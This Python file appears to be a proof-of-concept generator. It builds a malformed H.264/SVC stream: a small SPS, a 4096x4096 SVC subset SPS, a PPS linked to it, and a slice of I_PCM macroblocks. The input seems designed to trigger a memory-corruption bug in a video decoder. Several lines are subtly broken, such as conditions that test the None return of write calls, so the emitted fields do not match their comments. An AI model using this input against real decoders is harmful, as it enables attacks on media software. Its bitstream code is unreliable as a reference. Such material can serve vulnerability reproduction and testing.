import math

class Solution:

    class _BitstreamWriter:
        def __init__(self):
            self.buffer = bytearray()
            self.current_byte = 0
            self.bit_pos = 0  # 0-7, MSB to LSB

        def write_bit(self, bit: int):
            if bit:
                self.current_byte |= (1 << (7 - self.bit_pos))
            self.bit_pos += 1
            if self.bit_pos == 8:
                self.buffer.append(self.current_byte)
                self.current_byte = 0
                self.bit_pos = 0

        def write_bits(self, value: int, num_bits: int):
            for i in range(num_bits):
                bit = (value >> (num_bits - 1 - i)) & 1
                self.write_bit(bit)

        def write_ue(self, value: int):  # Unsigned Exp-Golomb
            val = value + 1
            num_bits = val.bit_length()
            leading_zeros = num_bits - 1
            
            self.write_bits(0, leading_zeros)
            self.write_bits(val, num_bits)

        def write_se(self, value: int):  # Signed Exp-Golomb
            if value <= 0:
                code_num = -2 * value
            else:
                code_num = 2 * value - 1
            self.write_ue(code_num)
            
        def rbsp_trailing_bits(self):
            self.write_bit(1)  # rbsp_stop_one_bit
            while self.bit_pos != 0:
                self.write_bit(0)  # rbsp_alignment_zero_bit

        def get_bytes(self) -> bytes:
            return bytes(self.buffer)

    def _create_sps(self, sps_id: int, width: int, height: int, is_svc: bool) -> bytes:
        writer = self._BitstreamWriter()
        
        profile_idc = 83 if is_svc else 100
        writer.write_bits(profile_idc, 8)  # profile_idc
        writer.write_bits(0, 8)           # constraint_set_flags, etc.
        writer.write_bits(51, 8)          # level_idc 5.1

        writer.write_ue(sps_id)           # seq_parameter_set_id

        if profile_idc in [100, 110, 122, 244, 44, 83, 86, 118, 128, 138, 139, 134, 144]:
            writer.write_ue(1)  # chroma_format_idc = 4:2:0
            writer.write_ue(0)  # bit_depth_luma_minus8
            writer.write_ue(0)  # bit_depth_chroma_minus8
            writer.write_bit(0)   # qpprime_y_zero_transform_bypass_flag
            writer.write_bit(0)   # seq_scaling_matrix_present_flag

        writer.write_ue(4)  # log2_max_frame_num_minus4
        writer.write_ue(0)  # pic_order_cnt_type
        if writer.write_ue(0) == 0:
            writer.write_ue(4) # log2_max_pic_order_cnt_lsb_minus4

        writer.write_ue(1)  # max_num_ref_frames
        writer.write_bit(0)   # gaps_in_frame_num_value_allowed_flag

        writer.write_ue((width // 16) - 1)  # pic_width_in_mbs_minus1
        writer.write_ue((height // 16) - 1) # pic_height_in_map_units_minus1

        writer.write_bit(1)   # frame_mbs_only_flag
        if not writer.write_bit(1): # Not frame_mbs_only_flag
            writer.write_bit(0) # mb_adaptive_frame_field_flag
        writer.write_bit(1)   # direct_8x8_inference_flag
        writer.write_bit(0)   # frame_cropping_flag
        writer.write_bit(0)   # vui_parameters_present_flag

        if is_svc:
            writer.write_bit(1)   # inter_layer_deblocking_filter_control_present_flag
            writer.write_bits(2, 2) # extended_spatial_scalability_idc
            writer.write_bit(0)   # chroma_phase_x_plus1_flag
            writer.write_bit(0)   # chroma_phase_y_plus1
            writer.write_bit(0)   # seq_ref_layer_chroma_phase_x_plus1_flag
            writer.write_bit(0)   # seq_ref_layer_chroma_phase_y_plus1
            writer.write_bit(1)   # seq_tcoeff_level_prediction_flag
            writer.write_bit(0)   # adaptive_tcoeff_level_prediction_flag
            writer.write_bit(1)   # slice_header_restriction_flag
            
        writer.rbsp_trailing_bits()
        
        nal_type = 15 if is_svc else 7
        nal_ref_idc = 3
        nal_unit_byte = (nal_ref_idc << 5) | nal_type
        
        return bytes([nal_unit_byte]) + writer.get_bytes()

    def _create_pps(self, pps_id: int, sps_id: int) -> bytes:
        writer = self._BitstreamWriter()
        writer.write_ue(pps_id)  # pic_parameter_set_id
        writer.write_ue(sps_id)  # seq_parameter_set_id
        
        writer.write_bit(0)    # entropy_coding_mode_flag
        writer.write_bit(0)    # bottom_field_pic_order_in_frame_present_flag
        writer.write_ue(0)   # num_slice_groups_minus1
        writer.write_ue(0)   # num_ref_idx_l0_default_active_minus1
        writer.write_ue(0)   # num_ref_idx_l1_default_active_minus1
        writer.write_bit(0)    # weighted_pred_flag
        writer.write_bits(0, 2) # weighted_bipred_idc
        writer.write_se(0)   # pic_init_qp_minus26
        writer.write_se(0)   # pic_init_qs_minus26
        writer.write_se(0)   # chroma_qp_index_offset
        writer.write_bit(0)    # deblocking_filter_control_present_flag
        writer.write_bit(0)    # constrained_intra_pred_flag
        writer.write_bit(0)    # redundant_pic_cnt_present_flag
        
        writer.rbsp_trailing_bits()
        
        nal_ref_idc = 3
        nal_unit_type = 8
        nal_unit_byte = (nal_ref_idc << 5) | nal_unit_type
        return bytes([nal_unit_byte]) + writer.get_bytes()

    def _create_slice(self, pps_id: int, num_mbs: int) -> bytes:
        nal_header_b1 = (3 << 5) | 20
        nal_header_b2 = 0b10000001
        nal_header_b3 = 0b00100000
        nal_header_b4 = 0b00000111
        nal_header = bytes([nal_header_b1, nal_header_b2, nal_header_b3, nal_header_b4])
        
        writer = self._BitstreamWriter()
        writer.write_ue(0)  # first_mb_in_slice
        writer.write_ue(7)  # slice_type (I_SLICE)
        writer.write_ue(pps_id)  # pic_parameter_set_id
        
        writer.write_bits(0, 8)  # frame_num (from log2_max_frame_num_minus4=4 -> 8 bits)
        writer.write_ue(0)  # idr_pic_id
        writer.write_bits(0, 8)  # pic_order_cnt_lsb (from log2_max_pic_order_cnt_lsb_minus4=4 -> 8 bits)
        
        writer.write_se(0)  # slice_qp_delta
        
        for _ in range(num_mbs):
            writer.write_ue(25) # mb_type = I_PCM
            
            while writer.bit_pos != 0:
                writer.write_bit(0)
            
            for _ in range(512): # PCM data
                writer.write_bits(0, 8)
        
        writer.rbsp_trailing_bits()
        
        return nal_header + writer.get_bytes()

    def solve(self, src_path: str) -> bytes:
        start_code = b'\x00\x00\x00\x01'
        
        sps0 = self._create_sps(sps_id=0, width=16, height=16, is_svc=False)
        sps1 = self._create_sps(sps_id=1, width=4096, height=4096, is_svc=True)
        pps0 = self._create_pps(pps_id=0, sps_id=1)
        slice0 = self._create_slice(pps_id=0, num_mbs=12)
        
        poc = bytearray()
        poc += start_code + sps0
        poc += start_code + sps1
        poc += start_code + pps0
        poc += start_code + slice0
        
        return bytes(poc)
